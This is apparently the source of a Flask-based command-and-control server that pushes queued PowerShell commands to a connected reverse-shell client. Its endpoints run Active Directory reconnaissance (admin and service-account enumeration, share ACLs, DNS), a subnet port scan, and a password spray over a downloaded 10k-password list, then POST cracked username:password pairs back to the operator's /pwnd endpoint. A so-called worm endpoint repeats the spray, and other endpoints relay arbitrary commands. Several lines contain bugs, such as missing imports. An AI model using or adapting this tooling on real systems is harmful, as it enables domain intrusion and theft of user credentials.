from flask import Flask, render_template, request, jsonify
import requests
import socket
import threading
import queue

app = Flask(__name__)

#Create file for logging
log = open("log.log","w")
log.close()

# Queue to hold commands to send
command_queue = queue.Queue()
# Queue to hold command results
result_queue = queue.Queue()
# Array to hold IP and port of connected clients
clients = []
# Holds last command retrived from command_queue
htmlcommand = ""
#Holds Results for main page
socket_output = ""

#def Server_info():
x = input("Would you like to assign specific IPs and ports? Y/N?  ")
if x in ('Y', 'y'):
    sserver_ip = input("Socket Sever IP:  ")
    sserver_port = input("Socket Server Port:  ")
    fserver_ip = input("Flask Server IP:  ")
    fserver_port = input("Flask Server Port:  ")
    
else: 
    sserver_ip = '0.0.0.0'
    sserver_port = 9999
    fserver_ip = '0.0.0.0'
    fserver_port = 80

# Connected client handler
def handle_client(client_socket):
    try:
        while True:
            # Wait for a command to be available in the queue
            command = command_queue.get()
            if command == 'exit':
                break  # Exit the loop if 'exit' command is placed in the queue
            
            # Stages last command for html retrieval
            htmlcommand = command

            # Send the command to all connnected clients
            client_socket.sendall(command.encode() + b'\n')
            # Receiving the response from the client
            output = client_socket.recv(4096).decode()
            # print(f"Output from the PowerShell client: {output}")
            result_queue.put(output)  # Store the result in the queue
            command_queue.task_done()
            if output:
                socket_output = output
                f = open("log.log", "a") # Write results to log file
                f.write(output)
                f.close() 


    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Closing the connection
        client_socket.close()

# Socket Server
def start_socket_server(host='0.0.0.0', port=9999):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"[*] Socket Listening on {host}:{port}")
    client_socket, addr = server_socket.accept()
    clients = f"{addr[0]}:{addr[1]}"
    print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
    client_handler = threading.Thread(target=handle_client, args=(client_socket,))
    client_handler.start()

# Start the socket server in a separate thread
threading.Thread(target=start_socket_server).start()

# Flask Endpoints 

# Adam and Eve homepage
@app.route('/', methods=['GET'])
def hello():
    server_ip = request.host.split(':')[0]
    return render_template('index.html', server_ip=server_ip, response=socket_output)

# Allows for custom commands to be added to the url then sent to all connected clients
@app.route('/cmd/<cmd>', methods=['GET'])
def send_command(cmd):
    command_queue.put(cmd)
    result = "Custom command sent to the PowerShell client."
    return render_template('page.html', response=result)

#########MADE Changes Here ##############
# Restrives last result from client. Results are stored in a queue with size 20. Refreshing will show the next result in the queue
@app.route('/server-data')
def server_data():
    try:
        result = result_queue.get_nowait()
        
    except queue.Empty:
        result = "No results available yet."
    finally:
        data = {"socket_output":(result)}
        return data

# Displays all results from clients. These are retrieved from file
@app.route('/allresults', methods=['GET'])
def get_all_result():
    f = open('log.log', 'r')
    result = f.read()
    f.close()
    return render_template('page.html', response=result)

# Clears file containing client results
@app.route('/clear', methods=['GET'])
def clear_results():
    f = open('log.log', 'w')
    f.close()
    result = "Results have been cleared"
    return render_template('page.html', response=result)

# Enumerates for "admin like" accounts. 
@app.route('/admins', methods=['GET'])
def enum_admins(): 
    cmd = '$groups = @("Administrators", "Backup Operators", "Hyper-V Administrators", "Domain Controllers", "Schema Admins", "Enterprise Admins", "Cert Publishers", "Domain Admins", "Group Policy Creator Owners", "Server Operators", "Protected Users", "Enterprise Key Admins", "DnsAdmins");Get-ADUser -Filter * -Properties * | ?{$_.samaccountname -like "*admin*" -or $_.memberof -like "*admin*"} | select samaccountname,name,description,distinguishedname,doesnotrequirepreauth,emailaddress,lastlogondate,memberof,passwordlastset,trustedfordelegation,trustedtoauthfordelegation,userprincipalname;$groups | foreach{$group = $_; Get-ADGroupMember $group}'
    command_queue.put(cmd)
    result = "Enum Admins Command sent to the PowerShell client."
    return render_template('page.html', response=result)
    
    
####################################################################
# Retrieves information about the current user of the client session
@app.route('/whoami', methods=['GET'])
def enum_whoami():
    cmd = "whoami /all; Get-ADUser $env:USERNAME -Properties * -ErrorAction SilentlyContinue"
    command_queue.put(cmd) 
    result = "Whoami commands sent to the PowerShell client."
    return render_template('page.html', response=result)
    
@app.route('/whoamifull', methods=['GET'])
def enum_whoamifull():
    cmd = "Get-ADUser $env:USERNAME -Properties * -ErrorAction SilentlyContinue; "
    command_queue.put(cmd) 
    result = "Whoami commands sent to the PowerShell client."
    return render_template('page.html', response=result)
    
@app.route('/whoamiall', methods=['GET'])
def enum_whoamiall():
    cmd = "whoami /all"
    command_queue.put(cmd) 
    result = "Whoami commands sent to the PowerShell client."
    return render_template('page.html', response=result)
   
@app.route('/calc2', methods=['GET'])    
def enum_calc2():
    cmd = "calc.exe; whoami"
    command_queue.put(cmd) 
    result = "calc commands sent to the PowerShell client."
    return render_template('page.html', response=result)
    
@app.route('/serviceaccounts', methods=['GET'])    
def enum_sa():
    cmd = "Get-ADUser -Filter { servicePrincipalName -like "*" } -Property SamAccountName,Enabled,certificates,DoesNotRequirePreAuth,isCriticalSystemObject,Memberof,PrincipalsAllowedToDelegateToAccount,servicePrincipalName,ServicePrincipalNames,TrustedForDelegation,TrustedToAuthForDelegation,UserPrincipalName "
    command_queue.put(cmd) 
    result = "Service Account enum commands sent to the PowerShell client."
    return render_template('page.html', response=result)
    
@app.route('/kroast', methods=['GET'])    
def enum_kroast():
    cmd = "Get-ADUser -Filter { servicePrincipalName -like "*" } -Property SamAccountName,Enabled,certificates,DoesNotRequirePreAuth,isCriticalSystemObject,Memberof,PrincipalsAllowedToDelegateToAccount,servicePrincipalName,ServicePrincipalNames,TrustedForDelegation,TrustedToAuthForDelegation,UserPrincipalName | Where-Object {$_.PasswordLastSet -lt ((Get-Date).AddYears(-3))}"
    command_queue.put(cmd) 
    result = "Service Account enum commands sent to the PowerShell client."
    return render_template('page.html', response=result)
    
@app.route('/enumusers', methods=['GET'])
def eunm_adusers():
    cmd = 'Get-ADUser -Filter {Name -like "*service*" -or Name -like "*svc*" -or Name -like "*admin*" -or Name -like "*administrator*" -or ServicePrincipalName -ne $null -or PasswordLastSet -lt (Get-Date).AddYears(-3)}'
    command_queue.put(cmd) 
    result = "Interesting user enum commands sent to the PowerShell client."
    return render_template('page.html', response=result)
    
@app.route('/enuminfra', methods=['GET'])
def enum_infra():
    cmd = r'$forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest(); $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain(); Write-Output "Forest Name: $($forest.Name), Domain Name: $($domain.Name), Domain Controller Count: $(($domain.DomainControllers).Count), Forest Functional Level: $($forest.ForestMode), Domain Functional Level: $($domain.DomainMode), Forest Creation Date: $($forest.CreatedDate), Domain Creation Date: $(Get-ADDomain | Select-Object -ExpandProperty WhenCreated), Trusts: $(Get-ADTrust -Filter * | Select-Object -ExpandProperty Name), Sites: $(Get-ADReplicationSite -Filter * | Select-Object -ExpandProperty Name), AD User Count: $(Get-ADUser -Filter *).Count, AD Computer Count: $(Get-ADComputer -Filter *).Count;'
    command_queue.put(cmd) 
    cmd = r'Write-Output "Service Accounts Count: $(Get-ADUser -Filter {Name -like \"*svc*\" -or UserPrincipalName -like \"*svc*\" -or ServicePrincipalName -ne $null}).Count, LDAP Signing Enabled: $(Get-ItemProperty -Path \"HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\" -Name \"LDAPServerIntegrity\" -ErrorAction SilentlyContinue).LDAPServerIntegrity, SMB Signing Enabled: $(Get-SmbServerConfiguration | Select-Object -ExpandProperty EnableSecuritySignature), Accounts without Kerberos Preauth: $(Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}).Count"'    
    command_queue.put(cmd) 
    result = "Infrastructure enum commands sent to the PowerShell client."
    return render_template('page.html', response=result)

@app.route('/conflate', methods=['GET', 'POST'])
def conflate():
    if request.method == 'POST':
        script = request.form['script']
        try:
            response = openai.ChatCompletion.create(
                model="gpt-4",
                messages=[
                    {"role": "system", "content": "You are a PowerShell script optimizer. Convert the provided script into a single line."},
                    {"role": "user", "content": script}
                ]
            )
            one_liner = response['choices'][0]['message']['content'].strip()
            url_encoded = urllib.parse.quote(one_liner)
            return jsonify({'one_liner': one_liner, 'url_encoded': url_encoded})
        except Exception as e:
            return jsonify({'error': str(e)}), 500
    return render_template('conflate.html')
#####################################################################



# Retrives firewall information of connected clients
@app.route('/firewall', methods=['GET'])
def enum_firewall():
    cmd = "Get-NetFirewallProfile -ErrorAction SilentlyContinue ; Get-NetFirewallRule -ErrorAction SilentlyContinue"
    command_queue.put(cmd) 
    result = "Firewall enumeration command sent to the PowerShell client."
    return render_template('page.html', response=result)

# Retrieves local services of connected client machines
@app.route('/services', methods=['GET'])
def enum_svc():
    cmd = "Get-Service"
    command_queue.put(cmd) 
    result = "Services command sent to the PowerShell client." 
    return render_template('page.html', response=result)

# Attempts to enumerate services on Domain Controllers
@app.route('/services/dc', methods=['GET'])
def enum_DCsvc():
    cmd = 'Get-ADDomainController | foreach{Get-WMIObject Win32_Service -computer $_.name -ErrorAction SilentlyContinue}'
    command_queue.put(cmd) 
    result = "DC Services command sent to the PowerShell client."  
    return render_template(page.html, response=result)

#Endpoint for HTTP payload delivery
@app.route('/pwnd',methods = ['POST', 'GET'])
def http_ctrl():
    if request.method == 'GET':
        return htmlcommand

    if request.method == 'POST':
        data = request.args.get('text_data', 'Default Value') # Post Method copies the request body to the results log file
        f = open("log.log", "a")
        f.write(data)
        f.close()   
        result_queue.put(data)
        return Response(status=204)

#Endpoint for HTTP payload Post. Posting a payload into the body will copy the payload to the command_queue
@app.route('/1337',methods = ['POST'])
def http_post():
    cmd = request.args.get('text_data', 'Default Value') 
    command_queue.put(cmd) 
    result = "Payload posted to command queue" 
    return render_template('page.html', response=result)     

# Attempts to enumerate shares on "server like" objects
@app.route('/shares', methods=['GET'])
def shares_all():
    cmd = r'$results = @(); Get-ADComputer -Filter * | ForEach-Object { $server = $_.Name; Get-WmiObject -ComputerName $server -Class win32_share -Filter "Description != \'Remote Admin\' and Description != \'Default share\' and Description != \'Remote IPC\' and Description != \'Printer Drivers\'" | ForEach-Object { $FolderPath = "\\$server\\$($_.Name)"; $Folders = @(Get-Item -Path $FolderPath -ErrorAction SilentlyContinue | Select-Object Name,FullName,LastWriteTime,Length); $Folders += Get-ChildItem -Path $FolderPath -Directory -ErrorAction SilentlyContinue | Select-Object Name,FullName,LastWriteTime,Length; $Folders | ForEach-Object { $Acls = Get-Acl -Path $_.FullName -ErrorAction SilentlyContinue; $Acls.Access | Where-Object { $_.IdentityReference -notlike "BUILTIN\\Administrators" -and $_.IdentityReference -notlike "CREATOR OWNER" -and $_.IdentityReference -notlike "NT AUTHORITY\\SYSTEM" -and $_.FileSystemRights -notlike "-*" -and $_.FileSystemRights -notlike "268435456" -and $_.IdentityReference -notlike "S-1-*" } | ForEach-Object { $properties = @{ FolderName = $_.Name; FolderPath = $_.FullName; IdentityReference = $_.IdentityReference.ToString(); Permissions = $_.FileSystemRights; AccessControlType = $_.AccessControlType.ToString(); IsInherited = $_.IsInherited }; $results += New-Object psobject -Property $properties } } } }; $results'
    command_queue.put(cmd) 
    result = "Enumerates AD share permissions command sent to Powershell client"
    return render_template('page.html', response=result)

# Attempts to enumerate ADIDNS
@app.route('/dns', methods=['GET'])
def enum_dns():
    cmd = 'Get-DnsServer -ErrorAction SilentlyContinue | ForEach-Object { $_ | Select-Object ServerName, Zones = @(Get-DnsServerZone -ComputerName $_.ServerName -ErrorAction SilentlyContinue), Records = @(Get-DnsServerResourceRecord -ZoneName * -ComputerName $_.ServerName -ErrorAction SilentlyContinue)}'
    command_queue.put(cmd) 
    result = "DNS enumeration command sent to Powershell client"
    return render_template('page.html', response=result)

# Checks for protocol signing and channel binding
@app.route('/protosign', methods=['GET'])
def enum_protosign():
    #Send payload to be sent down all open sockets   
    f = open('commands/proto.ps1', 'r')
    cmd = r'Write-host "LDAP Signing: $((Get-ItemProperty -Path ''HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters'' -Name ''LDAPServerIntegrity'' -ErrorAction SilentlyContinue).LDAPServerIntegrity); LDAP Channel Binding: $((Get-ItemProperty -Path ''HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters'' -Name ''LdapEnforceChannelBinding'' -ErrorAction SilentlyContinue).LdapEnforceChannelBinding); SMB Signing: $(Get-SmbServerConfiguration | Select-Object -ExpandProperty EnableSecuritySignature); SMBv1 Enabled: $(Get-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -ErrorAction SilentlyContinue | Select-Object -ExpandProperty State); NTLMv1 Allowed: $((Get-ItemProperty -Path ''HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'' -Name ''LmCompatibilityLevel'' -ErrorAction SilentlyContinue).LmCompatibilityLevel -lt 5); LM Hashes Allowed: $((Get-ItemProperty -Path ''HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa'' -Name ''NoLmHash'' -ErrorAction SilentlyContinue).NoLmHash -ne 1)"'
    command_queue.put(cmd) 
    result = "Protocol signing enumeration command sent to Powershell client"
    return render_template('page.html', response=result)

# Runs a powershell based port scan
@app.route('/portscan', methods=['GET'])
def port_scan():
    #Send payload to be sent down all open sockets   
    cmd = r'$subnet = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -match "\\d+\\.\\d+\\.\\d+\\."}).IPAddress -replace "\\d+$", ""; $ports = @(21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 9000, 1433, 1521, 2049, 5432); $subnet | ForEach-Object { $network = $_; $range = 2..254; $range | ForEach-Object { $ip = "${network}$_"; foreach ($port in $ports) { if (Test-NetConnection -ComputerName $ip -Port $port -InformationLevel Quiet) { Write-Host \"Port $port is open on $ip\" } } } }'
    command_queue.put(cmd) 
    result = "DNS enumeration command sent to Powershell client"
    return render_template('page.html', response=result)

# Runs a powershell based password spray
@app.route('/passspray', methods=['GET'])
def invoke_passspray():
    #Send payload to be sent down all open sockets   
    hostname = socket.gethostname()
    current_ip = socket.gethostbyname(hostname)
    cmd = '$users = Get-ADUser -Properties samaccountname -Filter * | select samaccountname; $count = $users.count; $page = Invoke-WebRequest -Uri https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10k-most-common.txt; $PasswordList = $page.Content.Split("`n"); $time = Get-Date; $UsernameAsPassword = ""; $domaindc = Get-ADDomainController; $body = "Now trying 10k common passwords against $count users. Current time is $($time.ToShortTimeString())"; Invoke-WebRequest -UseBasicParsing -Uri http://' + current_ip + '/pwnd -ContentType "text/plain" -Method POST -Body $body; if ($domaindc.count) { $domain = $domaindc[0].Domain } else { $domain = $domaindc.Domain }; $PasswordList | ForEach-Object { $password = $_.Trim(); $users | ForEach-Object { $user = $_.samaccountname; try { $Domain_check = [ADSI]"LDAP://$domain"; $Domain_check.PSBase.Invoke("RefreshCache", @(), @($user, $password)); if ($Domain_check.Name -ne $null) { $body += "$user : $password `n" } } catch {} } }; Invoke-WebRequest -UseBasicParsing -Uri http://' + current_ip + '/pwnd -ContentType "text/plain" -Method POST -Body $body'
    command_queue.put(cmd) 
    result = "Password spray sent to Powershell client"
    return render_template('page.html', response=result)

# Attempts to send a worm of the socket client
@app.route('/moab', methods=['GET'])
def hail_moab():
    #Send payload to be sent down all open sockets   
    f = open('commands/worm.ps1', 'r')
    cmd = '$users = Get-ADUser -Properties samaccountname -Filter * | select samaccountname; $count = $users.count; $page = Invoke-WebRequest -Uri https://github.com/danielmiessler/SecLists/raw/master/Passwords/Common-Credentials/10k-most-common.txt; $PasswordList = $page.Content.Split("`n"); $time = Get-Date; $UsernameAsPassword = ""; $domaindc = Get-ADDomainController; $body = "Now trying 10k common passwords against $count users. Current time is $($time.ToShortTimeString())"; Invoke-WebRequest -UseBasicParsing -Uri http://ChangeMe/pwnd -ContentType "text/plain" -Method POST -Body $body; if ($domaindc.count) { $domain = $domaindc[0].Domain } else { $domain = $domaindc.Domain }; $PasswordList | ForEach-Object { $password = $_.Trim(); $users | ForEach-Object { $user = $_.samaccountname; try { $Domain_check = [ADSI]"LDAP://$domain"; $Domain_check.PSBase.Invoke("RefreshCache", @(), @($user, $password)); if ($Domain_check.Name -ne $null) { $body += "$user : $password `n" } } catch {} } }; Invoke-WebRequest -UseBasicParsing -Uri http://ChangeMe/pwnd -ContentType "text/plain" -Method POST -Body $body'
    command_queue.put(cmd) 
    result = "Sprayin' and prayin'"
    return render_template('page.html', response=result)

# Runs a powershell based password spray
@app.route('/trimarc', methods=['GET'])
def invoke_trimarc():
    #Send payload to be sent down all open sockets   
    cmd = r'Param ([string]$DomainName = $env:userdnsdomain, [string]$RootDir = "C:\TM\"); function Get-ADForestInfo { Param ($DomainName); $ADForestFunctionalLevel = (Get-ADForest).ForestMode; $ADDomainFunctionalLevel = (Get-ADDomain $DomainName).DomainMode; Write-Host "The AD Forest Functional Level is $ADForestFunctionalLevel"; Write-Host "The AD Domain Functional Level ($DomainName) is $ADDomainFunctionalLevel" }; function Get-DomainControllers { Param ($ReportDir, $DomainName, $DomainDC); $DomainDCs = Get-ADDomainController -Filter * -Server $DomainDC; $DomainDCs | Select HostName,OperatingSystem | Format-Table -AutoSize; $DomainDCArray = @(); foreach ($DomainDCItem in $DomainDCs) { $DomainDCItem | Add-Member -MemberType NoteProperty -Name FSMORolesList -Value ($DomainDCItem.OperationMasterRoles -join ';') -Force; $DomainDCItem | Add-Member -MemberType NoteProperty -Name PartitionsList -Value ($DomainDCItem.Partitions -join ';') -Force; [array]$DomainDCArray += $DomainDCItem }; $DomainDCArray | Sort OperatingSystem | Export-CSV "$ReportDir\TrimarcADChecks-DomainDCs-$DomainName.csv" -NoTypeInformation; Write-Host "File save to $ReportDir\TrimarcADChecks-DomainDCs-$DomainName.csv" }; Write-Host "Starting AD Discovery & Checks" -Fore Cyan; if (!$DomainName) { $DomainName = (Get-ADDomain).DNSRoot }; $ADForestInfo = Get-ADForest; $ADDomainInfo = Get-ADDomain $DomainName; $DomainDC = $ADDomainInfo.PDCEmulator; Write-Host "\nForest Name: $($ADForestInfo.RootDomain)" -Fore Cyan; Get-ADForestInfo -DomainName $DomainName; Write-Host "\nAD Forest Domain Controllers:" -Fore Cyan; Get-DomainControllers -ReportDir "$($RootDir)Trimarc-ADReports" -DomainName $DomainName -DomainDC $DomainDC'    
    command_queue.put(cmd) 
    result = "Trimarc checks sent to Powershell client"
    return render_template('page.html', response=result)
"""
# Runs Azurehound Collector
@app.route('/azurehound', methods=['GET'])
def azure_hound():
        #Send payload to be sent down all open sockets   
        f = open('commands/azurehound.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return f"Attempting Azurehound collection"

@app.route('/sharphound', methods=['GET'])
def sharp_hound():
        #Send payload to be sent down all open sockets   
        f = open('sharphound.ps1', 'r')
        cmd = f.read() 
        command_queue.put(cmd) 
        return f"Attempting Sharphound collection"

#Azure Enumerator
"""

# Runs a lightweight Exchange vulnerability scan
@app.route('/exchange', methods=['GET'])
def sharp_hound():
    #Send payload to be sent down all open sockets   
    cmd = 'Write-Host "[INFO] Starting Exchange Server Vulnerability Scan..." -ForegroundColor Cyan; try { $schemaVersion = Get-ADObject (Get-ADRootDSE).schemaNamingContext -Property objectVersion | Select-Object -ExpandProperty objectVersion; Write-Host "[INFO] Exchange Schema Version: $schemaVersion" } catch { Write-Host "[ERROR] Unable to retrieve Exchange Schema Version." -ForegroundColor Red }; try { $orgConfig = Get-OrganizationConfig; if ($orgConfig.SplitPermissions) { Write-Host "[INFO] Exchange is in the AD Split Permission model." -ForegroundColor Green } else { Write-Host "[WARNING] Exchange is NOT in the AD Split Permission model." -ForegroundColor Yellow } } catch { Write-Host "[ERROR] Unable to determine Exchange permission model." -ForegroundColor Red }; try { $exchangeVersion = Get-ExchangeServer | Select-Object Name, AdminDisplayVersion; Write-Host "[INFO] Exchange Server Versions:" -ForegroundColor Cyan; $exchangeVersion | ForEach-Object { Write-Host "Server: $($_.Name), Version: $($_.AdminDisplayVersion)" }; $receiveConnectors = Get-ReceiveConnector | Where-Object { $_.PermissionGroups -contains "AnonymousUsers" -and $_.AuthMechanism -contains "None" }; if ($receiveConnectors) { Write-Host "[WARNING] Open SMTP Relay detected on the following connectors:" -ForegroundColor Yellow; $receiveConnectors | ForEach-Object { Write-Host $_.Name } } else { Write-Host "[INFO] No open SMTP relay connectors detected." -ForegroundColor Green }; $virtualDirs = Get-ExchangeVirtualDirectory | Where-Object { $_.ExternalUrl -ne $null }; if ($virtualDirs) { Write-Host "[WARNING] Exchange Admin Center or PowerShell endpoints are externally accessible:" -ForegroundColor Yellow; $virtualDirs | ForEach-Object { Write-Host $_.Name } } else { Write-Host "[INFO] No externally accessible management endpoints detected." -ForegroundColor Green }; $certs = Get-ExchangeCertificate | Where-Object { $_.Status -eq "Valid" }; $expiredCerts = $certs | Where-Object { $_.NotAfter -lt (Get-Date) }; if ($expiredCerts) { Write-Host "[WARNING] Expired SSL Certificates found:" -ForegroundColor Yellow; $expiredCerts | ForEach-Object { Write-Host "Certificate: $($_.FriendlyName), Expired: $($_.NotAfter)" } } else { Write-Host "[INFO] No expired SSL certificates detected." -ForegroundColor Green }; $authSettings = Get-AuthenticationPolicy; if ($authSettings -and ($authSettings.BasicAuthEnabledServices -contains "IMAP4" -or $authSettings.BasicAuthEnabledServices -contains "POP3")) { Write-Host "[WARNING] Basic Authentication is enabled for some services." -ForegroundColor Yellow } else { Write-Host "[INFO] Basic Authentication is disabled for all services." -ForegroundColor Green }; $dag = Get-DatabaseAvailabilityGroup -ErrorAction SilentlyContinue; if ($dag) { Write-Host "[INFO] DAG Configuration detected." -ForegroundColor Green } else { Write-Host "[WARNING] No DAG configuration found, high availability may be compromised." -ForegroundColor Yellow }; $antispamSettings = Get-ContentFilterConfig -ErrorAction SilentlyContinue; if ($antispamSettings) { Write-Host "[INFO] Anti-Spam filtering is enabled." -ForegroundColor Green } else { Write-Host "[WARNING] Anti-Spam filtering is disabled." -ForegroundColor Yellow } } catch { Write-Host "[ERROR] Unable to check Exchange misconfigurations." -ForegroundColor Red }; Write-Host "[INFO] Exchange Server Vulnerability Scan Completed." -ForegroundColor Cyan'
    command_queue.put(cmd) 
    result = "Excahnge vulnerability scan command sent to Powershell client"
    return render_template('page.html', response=result)

# Kills all client connections
@app.route('/kill', methods=['GET'])
def kill_conns():
    command_queue.put("exit")
    result = "Connection kill command sent."
    return render_template('page.html', response=result)
    
# Returns connected clients to the browser
@app.route('/clients', methods=['GET'])
def connected_clients():
    return render_template('page.html', response=clients)

# Start Flask Server
if __name__ == '__main__':
    app.run(host= '0.0.0.0',port=80, debug=False) 
